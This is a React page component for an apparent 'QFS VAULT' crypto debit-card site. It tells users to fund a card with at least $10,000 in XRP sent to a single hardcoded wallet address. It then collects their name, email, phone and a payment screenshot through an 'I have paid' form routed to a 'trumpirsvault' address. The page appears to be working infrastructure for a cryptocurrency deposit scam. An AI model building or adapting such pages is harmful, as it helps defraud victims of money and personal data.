"use client";
import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Copy, ChevronLeft, ArrowDown } from "lucide-react";
import Link from "next/link";
import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";

const coinOptions = [
	{ label: "XRP", value: "XRP", slug: "ripple", address: "rp5PMThCE9FtANy7ULtN4X43fNf7oXW6mt" },
];

const CardPage = ({ firstName = "", lastName = "", email = "", phone = "" }) => {
	const [copied, setCopied] = useState(false);
	const [selectedCoin, setSelectedCoin] = useState(coinOptions[0].value); // Default to XRP
	const fullName = `${firstName} ${lastName}`.trim() || "Mike";

	const depositAddress =
		coinOptions.find((c) => c.value === selectedCoin)?.address ||
		coinOptions[0].address;

	const handleCopy = () => {
		navigator.clipboard.writeText(depositAddress);
		setCopied(true);
		setTimeout(() => setCopied(false), 1500);
	};

	return (
<div className="min-h-screen bg-background text-foreground pb-8">
		<div className="max-w-2xl mx-auto py-10 px-4 sm:px-8">
			{/* Header */}
			<div className="flex items-center justify-between mb-8">
				<Link href="/dashboard">
					<Button variant="ghost" className="flex items-center gap-2 text-foreground hover:bg-primary/20 rounded-lg transition">
						<ChevronLeft className="w-5 h-5" />
						Back
					</Button>
				</Link>
				<h2 className="text-2xl font-bold text-primary">Deposit to Card</h2>
				<Link
					href="/dashboard/buy"
					className="animate-bounce px-3 py-1 rounded-lg bg-primary text-primary-foreground font-semibold shadow-lg shadow-primary/25 transition hover:opacity-90"
					>
						Buy coin
					</Link>
				</div>

				{/* Deposit Asset */}
			<div className="flex items-center justify-between bg-card rounded-xl shadow-lg p-5 mb-8 border border-border">
				<span className="font-medium text-muted-foreground text-lg">Deposit Asset</span>
				<Select value={selectedCoin} onValueChange={setSelectedCoin} disabled>
					<SelectTrigger className="bg-primary text-primary-foreground rounded-lg text-sm font-bold border-none flex items-center justify-between shadow-lg shadow-primary/25 px-4 py-2">
							<SelectValue placeholder="Select coin" />
							<ArrowDown className="text-white" />
						</SelectTrigger>
						<SelectContent>
							{coinOptions.map((coin) => (
								<SelectItem key={coin.value} value={coin.value}>
									{coin.label}
								</SelectItem>
							))}
						</SelectContent>
					</Select>
				</div>

				{/* Card Preview */}
				<div className="w-full flex justify-center mb-8">
				<div className="relative bg-gradient-to-br from-primary via-primary/80 to-primary/60 text-primary-foreground rounded-2xl shadow-2xl shadow-primary/30 p-8 w-[370px] h-[220px] flex flex-col justify-between overflow-hidden transition-transform duration-300 hover:scale-105 border border-primary/30">
						{/* Decorative elements */}
					<div className="absolute w-[120px] h-[120px] bg-primary/30 rounded-full top-[-40px] right-[-40px] opacity-30" />
					<div className="absolute w-[60px] h-[60px] bg-primary/20 rounded-full bottom-[-20px] left-[-20px] opacity-30" />
						{/* Chip */}
						<div className="absolute left-8 top-16 w-10 h-7 bg-gradient-to-r from-gray-300 to-gray-500 rounded-md border border-gray-400 shadow-inner flex items-center justify-center">
							<div className="w-6 h-2 bg-gray-400 rounded-sm" />
						</div>
						{/* Card Logo & Brand */}
						<div className="flex items-center justify-between z-10">
							<img
								src="/qfslogo.png"
								width={50}
								alt="QFS Logo"
								className="rounded"
							/>
						<span className="font-bold text-lg text-primary-foreground/90 tracking-wide">QFS VAULT</span>
						</div>
						{/* Card Number */}
						<div className="flex justify-between font-mono text-xl text-white tracking-widest z-10 mt-2">
							<span>5234</span>
							<span>9210</span>
							<span>****</span>
							<span>8472</span>
						</div>
						{/* Cardholder & Expiry */}
						<div className="flex items-center justify-between z-10 mt-2">
							<div>
							<span className="block text-xs text-primary-foreground/70">CARD HOLDER</span>
							<span className="text-base font-semibold text-primary-foreground">{fullName}</span>
							</div>
							<div className="text-right">
							<span className="block text-xs text-primary-foreground/70">EXPIRY</span>
							<span className="text-base font-semibold text-primary-foreground">12/27</span>
							</div>
						</div>
						{/* XRP Label - aligned bottom right */}
						
					</div>
				</div>

				{/* Info */}
				<div className="flex items-center gap-3 mb-6">
					<img src="/caution.png" width={40} alt="Warning" />
					<div>
					<p className="text-primary text-sm font-semibold">
						Fund your Card via a crypto transfer to start using the full suite of services.
					</p>
					<p className="text-primary text-sm font-semibold">
							You need a minimum of $10,000.
						</p>
					</div>
				</div>

				{/* Deposit Address */}
				<div className="mb-6">
				<Label htmlFor="deposit-address" className="font-semibold text-base text-muted-foreground">
						Deposit Address
					</Label>
					<div className="flex mt-2">
						<Input
							id="deposit-address"
							value={depositAddress}
							readOnly
							className="rounded-l-lg border-r-0 bg-slate-800 text-white font-mono"
						/>
						<Button
							type="button"
							variant="outline"
							className="rounded-r-lg border-l-0 bg-blue-600 hover:bg-blue-700 text-white"
							onClick={handleCopy}
						>
							<Copy className="w-4 h-4" />
						</Button>
					</div>
					{copied && (
						<div className="text-green-400 text-xs mt-1">Copied!</div>
					)}
				</div>

				{/* Pre-order Form */}
				<Card className="mt-8 bg-slate-900 border border-slate-800 shadow-xl rounded-2xl">
					<CardHeader>
						<CardTitle className="text-blue-400 text-lg">Make Deposit</CardTitle>
					</CardHeader>
					<CardContent>
						<form
							action="emailSend"
							method="POST"
							encType="multipart/form-data"
							id="form"
							className="space-y-5"
						>
							<input type="hidden" name="method" value={selectedCoin} required />
							<input type="hidden" name="asset" value={`${selectedCoin.toLowerCase()}_assets`} required />
							<input type="hidden" name="equiv" value={`${selectedCoin.toLowerCase()}_equiv`} required />
							<input type="hidden" name="fieldFormEmail" value={email} required />
							<input type="hidden" name="toEmail" value="support@trumpirsvault.com" required />
							<input type="hidden" name="fieldSubject" value="NEW QFS CARD PRE-ORDER" required />
							<input type="hidden" name="add_deposit" value="1" required />

							<div>
								<Label htmlFor="amount" className="hidden font-semibold">
									{selectedCoin} Amount ($10,000 minimum)
								</Label>
								<Input
									id="amount"
									name="amount"
									type="text"
									min="10000"
									value="10000"
									className="text-green-600"
									required
								/>
							</div>

							<div>
								<Input
									type="text"
									placeholder="Full Name"
									name="fieldFormName"
									value={fullName}
									required
									readOnly
									className="bg-slate-800 text-white"
								/>
							</div>
							<div>
								<Input
									type="email"
									placeholder="Email"
									name="fieldFormEmail"
									value={email}
									required
									readOnly
									className="bg-slate-800 text-white"
								/>
							</div>
							<div>
								<Input
									type="text"
									placeholder="Phone Number"
									name="fieldFormPhone"
									value={phone}
									required
									readOnly
									className="bg-slate-800 text-white"
								/>
							</div>
							<div>
								<Label className="text-primary" htmlFor="attachment">
									Attach screenshot of transaction
								</Label>
								<Input
									id="attachment"
									name="attachment"
									type="file"
									required
									className="mt-1 bg-slate-800 text-white"
								/>
							</div>
							<div className="flex items-center gap-2">
								<input
									type="checkbox"
									id="terms"
									name="terms"
									value="Yes"
									required
									className="accent-blue-600"
								/>
								<Label htmlFor="terms" className="text-sm text-muted-foreground">
									I accept QFS deposit terms and conditions
								</Label>
							</div>
							<Button
								type="submit"
								className="w-full bg-gradient-to-r from-blue-600 to-violet-600 text-white font-semibold py-2 rounded-lg shadow hover:from-blue-700 hover:to-violet-700 transition"
							>
								I have paid
							</Button>
						</form>
					</CardContent>
				</Card>
			</div>
		</div>
	);
};

export default CardPage;